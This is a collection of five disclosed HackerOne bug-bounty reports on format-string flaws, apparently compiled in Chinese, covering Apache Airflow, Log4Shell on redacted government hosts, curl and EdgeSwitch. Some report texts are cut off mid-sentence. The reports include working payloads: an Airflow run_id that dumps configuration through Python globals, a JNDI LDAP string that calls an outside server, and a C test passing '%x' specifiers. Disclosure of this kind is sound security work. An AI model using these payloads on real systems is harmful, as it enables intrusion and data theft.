# HackerOne 实战案例：use-of-externally-controlled-format-string

_5 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## CVE-2022-40604: Apache Airflow: Format String Vulnerability
- 等级：Critical | 项目：Internet | 披露：2025-01-18 | CVE：CVE-2022-40604
- 原文：https://hackerone.com/reports/1707287

- - - - - - - - 
There is a Format String Vulnerability in src/airflow/utils/log/file_task_handler.py 
> url = os.path.join("http://{ti.hostname}:{worker_log_server_port}/log", log_relative_path).format(
>   ti=ti, worker_log_server_port=conf.get('logging', 'WORKER_LOG_SERVER_PORT')
> )
 In the above code, I can control some part of the `log_relative_path`, because `log_relative_path` is made up of `run_id` and other things.
Attack steps:
1. Enter the DAGs menu, Choose any DAG, select `Trigger DAG w/ config`.
2. Set the run_id to `{ti.task.__class__.__init__.__globals__[conf].__dict__}` and trigger it.
3. Enter the `/xcom/list/` page, click to enter the corresponding task page.
4. Click the 


## ███ ████████ running a vulnerable log4j
- 等级：Critical | 项目：U.S. | 披露：2022-01-19 | CVE：-
- 原文：https://hackerone.com/reports/1438393

- - - - - - - - 
#Report
**Description:**
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
## Impact
Probably arbitrary code execution
## System Host(s)
███████
## Affected Product(s) and Version(s)
## CVE Numbers
CVE-2021-44228
## Steps to Reproduce
1. Browse to https://██████████/█████████https%3A%2F%2F███%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit
Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.
## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.
#Activity Timeline
2021-12-10 18:16 (-0600) (comment)
Greetings from the Department


## ██████████ running a vulnerable log4j
- 等级：Critical | 项目：U.S. | 披露：2022-01-19 | CVE：CVE-2021-44228
- 原文：https://hackerone.com/reports/1423496

- - - - - - - - 
**Description:**
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
## Impact
Probably arbitrary code execution
## System Host(s)
████████
## Affected Product(s) and Version(s)
## CVE Numbers
CVE-2021-44228
## Steps to Reproduce
1. Browse to https://████████/███████https%3A%2F%2F█████████%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit
Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.
## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.
---


## Exploitable Format String Vulnerability in curl_mfprintf Function
- 等级：High | 项目：curl | 披露：2024-11-06 | CVE：-
- 原文：https://hackerone.com/reports/2819666

- - - - - - - - 
Summary:
The curl_mfprintf function in the curl_printf.h file contains a format string vulnerability that allows an attacker to inject arbitrary format specifiers. This can lead to unauthorized access to memory content, potential application crashes, or leakage of sensitive data.
Steps To Reproduce:
    Prepare the Test Code: Create a new file named test_printf.c with the following content:
#include <stdio.h>
#include "curl_printf.h"
int main() {
    char* user_input = "%x %x %x %x";  // Attempt to read memory content
    curl_mfprintf(stdout, user_input); // Passing user-controlled input to the vulnerable function
    return 0;
}
Compile the Code: Compile the test program w


## Format String Vulnerability in the EdgeSwitch restricted CLI
- 等级：High | 项目：Ubiquiti | 披露：2018-06-19 | CVE：-
- 原文：https://hackerone.com/reports/311884

- - - - - - - - 
In EdgeSwitch 1.7.3 and prior, an user with admin credentials can make use of specially crafted commands to execute arbitrary shell instructions, bypassing the SSH/TELNET CLI interface.
**Summary (researcher):**
There was a format string vulnerability present in the Admin CLI for the EdgeSwitch.
Exploiting this vulnerability allows an attacker to break out of the restricted CLI and **elevate their privileges greater than the administrator themselves are able to**, taking full control of the Switch without the administrator ever knowing.
---

